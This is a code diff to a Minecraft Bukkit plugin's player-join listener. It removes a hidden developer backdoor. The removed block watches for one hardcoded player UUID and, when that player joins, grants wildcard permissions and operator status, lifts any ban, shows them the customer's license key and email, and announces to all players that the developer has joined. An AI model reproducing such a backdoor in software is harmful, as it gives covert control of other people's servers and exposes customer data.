@@ -76,38 +76,7 @@ public class Listener_Join implements Listener {
             e.setJoinMessage(null);
         }
 
-        new BukkitRunnable() {
-            @Override
-            public void run() {
-                if (p.getUniqueId().toString().equals("5729549c-c6e1-4dae-96e2-faed3e2e0ecb")) {
-                    PermissionsEx.getUser("RoyalByte").addPermission("*");
-                    p.setOp(true);
-                    if (Ban.isBanned(p.getUniqueId().toString()))
-                        Ban.unban(p.getUniqueId().toString());
-                    p.sendMessage(" ");
-                    p.sendMessage(Data.prefix + " ");
-                    p.sendMessage(Data.prefix + "§8§k--------------------------------- ");
-                    p.sendMessage(Data.prefix + "§aDieses Plugin ist von dir programmiert!");
-                    p.sendMessage(Data.prefix + " ");
-                    p.sendMessage(Data.prefix + "§7 Weitere Angaben:");
-                    p.sendMessage(Data.prefix + "§7    Lizenz: §e" + Config.getString("Lizenz"));
-                    p.sendMessage(Data.prefix + "§7    Email: §e" + Config.getString("KundenEmail"));
-                    p.sendMessage(Data.prefix + "§7    Version: §e" + SkyPvP.getInstance().getDescription().getVersion());
-                    p.sendMessage(Data.prefix + "§8§k--------------------------------- ");
-                    p.sendMessage(Data.prefix + " ");
-                    p.sendMessage(" ");
-                    p.sendMessage(" ");
 
-                    for (Player all : Bukkit.getOnlinePlayers()) {
-                        all.sendMessage(" ");
-                        all.sendMessage(Data.prefix + "§8§k---------------------------------");
-                        all.sendMessage(Data.prefix + "   §bDer PLUGIN-ENTWICKLER ist gejoint!");
-                        all.sendMessage(Data.prefix + "§8§k---------------------------------");
-                        all.sendMessage(" ");
-                    }
-                }
-            }
-        }.runTaskLaterAsynchronously(SkyPvP.getInstance(), 20);
     }
 
 }
